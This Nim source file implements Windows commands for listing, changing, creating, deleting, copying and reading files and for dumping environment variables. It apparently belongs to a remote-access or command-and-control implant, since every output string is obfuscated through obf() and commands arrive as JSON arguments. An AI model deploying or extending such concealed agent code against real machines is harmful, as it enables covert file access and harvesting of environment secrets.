import std/json
from std/os import parentDir
from std/strutils import splitWhitespace, strip
import ../utils/global
import ../utils/general/strings
import ../utils/winapi/handlers
type Wchar = uint16

var prev: array[260, char]
var prevLen = 0

proc note(prefix, text: string; buf: var openArray[char]): int =
  # Writes a prefix and text into the buffer
  if prefix.len + text.len > buf.len: return -1
  if prefix.len > 0: copyMem(addr buf[0], unsafeAddr prefix[0], prefix.len)
  if text.len > 0: copyMem(addr buf[prefix.len], unsafeAddr text[0], text.len)
  prefix.len + text.len

proc arrow(a, b: string; buf: var openArray[char]): int =
  # Writes a source to destination line
  let sep = obf(" -> ")
  if a.len + sep.len + b.len > buf.len: return -1
  if a.len > 0: copyMem(addr buf[0], unsafeAddr a[0], a.len)
  for i, c in sep: buf[a.len + i] = c
  if b.len > 0: copyMem(addr buf[a.len + sep.len], unsafeAddr b[0], b.len)
  a.len + sep.len + b.len

proc skipDot(name: ptr UncheckedArray[Wchar]): bool =
  # Checks that a name is the current or parent entry
  if name[0] != Wchar(ord('.')): return false
  if name[1] == 0'u16: return true
  name[1] == Wchar(ord('.')) and name[2] == 0'u16

proc ioErrorMessage*(code: culong): string =
  # Maps a Windows error code to a short message
  case int32(code)
  of 2, 3:
    obf("File not found")
  of 5:
    obf("Permission denied")
  of 32:
    obf("File is in use")
  of 33:
    obf("File is locked")
  of 123:
    obf("Invalid file path")
  of 206:
    obf("Path too long")
  else:
    obf("File error (code=") & $int32(code) & obf(")")

proc paramValue*(params: string; jsonKey: string; flags: openArray[string]): string =
  # Reads a parameter from json or flags
  try:
    let p = parseJson(params)
    if p.hasKey(jsonKey):
      return p[jsonKey].getStr().strip(chars = {'"', '\''})
    if p.hasKey(obf("args")):
      let parts = p[obf("args")].getStr().splitWhitespace()
      var i = 0
      while i < parts.len:
        for flag in flags:
          if parts[i] == flag and i + 1 < parts.len:
            return parts[i + 1].strip(chars = {'"', '\''})
        inc i
  except JsonParsingError:
    discard
  ""

proc run_ls*(args: string; buf: var openArray[char]): int =
  # Lists files in a directory
  var dir: array[260, char]
  var wdir: array[260, Wchar]
  var wpat: array[280, Wchar]
  var pat: array[280, char]
  var srcStr = args
  if srcStr.len == 0:
    discard getCurrentDirectoryW(culong(wdir.len), addr wdir[0])
    let dn = wtoa(wdir, dir)
    srcStr = newString(dn)
    copyMem(addr srcStr[0], addr dir[0], dn)
  var n = min(srcStr.len, pat.len - 2)
  copyMem(addr pat[0], unsafeAddr srcStr[0], n)
  if n > 0 and pat[n - 1] != '\\':
    pat[n] = '\\'; inc n
  pat[n] = '*'; inc n
  var patStr = newString(n)
  copyMem(addr patStr[0], addr pat[0], n)
  asciiWide(patStr, wpat)
  var data: array[592, byte]
  let h = findFirstFileW(addr wpat[0], addr data[0])
  if h == cast[pointer](-1): return -1
  defer: discard findClose(h)
  var body: array[8192, char]
  var pos = 0
  var count: culong = 0
  while true:
    let attrs = rdLe32(data, 0)
    let name = cast[ptr UncheckedArray[Wchar]](addr data[44])
    if skipDot(name):
      zeroMem(addr data[0], data.len)
      if findNextFileW(h, addr data[0]) == 0: break
      continue
    if pos + 320 >= body.len: break
    const dateW = 19
    const sizeW = 8
    const typeW = 4
    var st: array[16, byte]
    var dateBuf: array[20, char]
    var dateStr = obf("-")
    if not (rdLe32(data, 20) == 0 and rdLe32(data, 24) == 0):
      if fileTimeToSystemTime(addr data[20], addr st[0]) != 0:
        let dn = fmtSystemTime(st, dateBuf)
        if dn > 0:
          dateStr = newString(dn)
          copyMem(addr dateStr[0], addr dateBuf[0], dn)
    if not appendCol(body, pos, dateStr, dateW, false): break
    if not appendStr(body, pos, " "): break
    let isDir = (attrs and 0x10) != 0
    var sizeBuf: array[16, char]
    var sizeStr = ""
    if not isDir:
      let sz = (uint64(rdLe32(data, 28)) shl 32) or uint64(rdLe32(data, 32))
      let sn = fmtSize(sz, sizeBuf)
      if sn > 0:
        sizeStr = newString(sn)
        copyMem(addr sizeStr[0], addr sizeBuf[0], sn)
      else:
        sizeStr = obf("?")
    if not appendCol(body, pos, sizeStr, sizeW, true): break
    if not appendStr(body, pos, "  "): break
    let lbl = if isDir: obf("dir") elif (attrs and 0x2) != 0: obf("hid") else: obf("file")
    if not appendCol(body, pos, lbl, typeW, false): break
    if not appendStr(body, pos, "  "): break
    if not appendWcs(body, pos, name, 259): break
    if not appendByte(body, pos, '\n'): break
    inc count
    zeroMem(addr data[0], data.len)
    if findNextFileW(h, addr data[0]) == 0: break
  let hdr = obf("total ") & $count & "\n"
  if hdr.len + pos > buf.len: return -1
  copyMem(addr buf[0], unsafeAddr hdr[0], hdr.len)
  copyMem(addr buf[hdr.len], addr body[0], pos)
  hdr.len + pos

proc run_pwd*(buf: var openArray[char]): int =
  # Writes the current directory
  var w: array[260, Wchar]
  discard getCurrentDirectoryW(culong(w.len), addr w[0])
  wtoa(w, buf)

proc run_cd*(args: string; buf: var openArray[char]): int =
  # Changes the current directory
  var w: array[260, Wchar]
  if args.len == 0: return run_pwd(buf)
  if args.len == 1 and args[0] == '-':
    if prevLen == 0: return -1
    var ps = newString(prevLen)
    copyMem(addr ps[0], addr prev[0], prevLen)
    asciiWide(ps, w)
  else:
    var cur: array[260, Wchar]
    discard getCurrentDirectoryW(culong(cur.len), addr cur[0])
    prevLen = wtoa(cur, prev)
    asciiWide(args, w)
  if setCurrentDirectoryW(addr w[0]) == 0: return -1
  run_pwd(buf)

proc run_mkdir*(args: string; buf: var openArray[char]): int =
  # Creates a directory
  var w: array[260, Wchar]
  asciiWide(args, w)
  if createDirectoryW(addr w[0], nil) == 0: return -1
  note(obf("created: "), args, buf)

proc run_rmdir*(args: string; buf: var openArray[char]): int =
  # Removes a directory
  var w: array[260, Wchar]
  asciiWide(args, w)
  if removeDirectoryW(addr w[0]) == 0: return -1
  note(obf("removed: "), args, buf)

proc run_del*(args: string; buf: var openArray[char]): int =
  # Deletes a file
  var w: array[260, Wchar]
  asciiWide(args, w)
  if deleteFileW(addr w[0]) == 0: return -1
  note(obf("deleted: "), args, buf)

proc run_copy*(args: string; buf: var openArray[char]): int =
  # Copies a file to another path
  var ws, wd: array[260, Wchar]
  let parts = args.splitWhitespace()
  if parts.len < 2: return -1
  let src = parts[0]
  let dst = parts[1]
  asciiWide(src, ws)
  asciiWide(dst, wd)
  if copyFileW(addr ws[0], addr wd[0], 0) == 0: return -1
  arrow(src, dst, buf)

proc run_move*(args: string; buf: var openArray[char]): int =
  # Moves a file to another path
  var ws, wd: array[260, Wchar]
  let parts = args.splitWhitespace()
  if parts.len < 2: return -1
  let src = parts[0]
  let dst = parts[1]
  asciiWide(src, ws)
  asciiWide(dst, wd)
  if moveFileW(addr ws[0], addr wd[0], nil, nil, 1) == 0: return -1
  arrow(src, dst, buf)

proc run_ren*(args: string; buf: var openArray[char]): int =
  # Renames a file in its folder
  var ws, wd: array[260, Wchar]
  let parts = args.splitWhitespace()
  if parts.len < 2: return -1
  let src = parts[0]
  let name = parts[1]
  let parentPath = parentDir(src)
  if parentPath.len == 0: return -1
  let fullStr = parentPath & '\\' & name
  asciiWide(src, ws)
  asciiWide(fullStr, wd)
  if moveFileW(addr ws[0], addr wd[0], nil, nil, 1) == 0: return -1
  arrow(src, fullStr, buf)

proc run_cat*(args: string; buf: var openArray[char]): int =
  # Reads a file into the buffer
  var w: array[260, Wchar]
  asciiWide(args, w)
  let h = createFileW(addr w[0], 0x80000000'u32, 1, nil, 3, 0x80, 0)
  if h == cast[pointer](-1): return -1
  defer: discard closeHandle(h)
  var total = 0
  while total < buf.len:
    var n: culong = 0
    if readFile(h, addr buf[total], culong(buf.len - total), addr n, nil) == 0 or n == 0: break
    total += int(n)
  total

proc run_echo*(args: string; buf: var openArray[char]): int =
  # Writes text or an environment value
  if args.len > 0 and args[0] == '$':
    let key = args[1 .. ^1].strip()
    if key.len == 0:
      return 0
    var wname: array[128, Wchar]
    var wval: array[512, Wchar]
    asciiWide(key, wname)
    let n = getEnvironmentVariableW(addr wname[0], addr wval[0], culong(wval.len))
    if n == 0:
      return 0
    var val: array[512, char]
    let vl = wtoa(wval, val)
    if vl > buf.len:
      return -1
    if vl > 0:
      copyMem(addr buf[0], addr val[0], vl)
    return vl
  if args.len > buf.len:
    return -1
  if args.len > 0:
    copyMem(addr buf[0], unsafeAddr args[0], args.len)
  args.len

proc run_attrib*(args: string; buf: var openArray[char]): int =
  # Reads file attributes into the buffer
  var w: array[260, Wchar]
  asciiWide(args, w)
  let attrStr = $getFileAttributesW(addr w[0])
  if attrStr.len + 2 + args.len > buf.len: return -1
  copyMem(addr buf[0], unsafeAddr attrStr[0], attrStr.len)
  buf[attrStr.len] = ' '; buf[attrStr.len + 1] = ' '
  copyMem(addr buf[attrStr.len + 2], unsafeAddr args[0], args.len)
  attrStr.len + 2 + args.len

proc run_set*(args: string; buf: var openArray[char]): int =
  # Reads environment variables into the buffer
  if args.len == 0:
    let envBlock = getEnvironmentStringsW()
    if envBlock == nil: return -1
    defer: discard freeEnvironmentStringsW(envBlock)
    var pos = 0
    var p = cast[ptr UncheckedArray[Wchar]](envBlock)
    var i = 0
    while p[i] != 0'u16:
      var j = 0
      while p[i + j] != 0'u16:
        if pos >= buf.len: return pos
        buf[pos] = char(p[i + j]); inc pos; inc j
      if pos >= buf.len: return pos
      buf[pos] = '\n'; inc pos
      i += j + 1
    return pos
  var wname: array[128, Wchar]
  var wval: array[512, Wchar]
  asciiWide(args, wname)
  let n = getEnvironmentVariableW(addr wname[0], addr wval[0], culong(wval.len))
  if n == 0:
    let miss = obf("(not set)")
    if args.len + 1 + miss.len > buf.len: return -1
    if args.len > 0: copyMem(addr buf[0], unsafeAddr args[0], args.len)
    buf[args.len] = '='
    for i, c in miss: buf[args.len + 1 + i] = c
    return args.len + 1 + miss.len
  var val: array[512, char]
  let vl = wtoa(wval, val)
  if args.len + 1 + vl > buf.len: return -1
  if args.len > 0: copyMem(addr buf[0], unsafeAddr args[0], args.len)
  buf[args.len] = '='
  copyMem(addr buf[args.len + 1], addr val[0], vl)
  args.len + 1 + vl
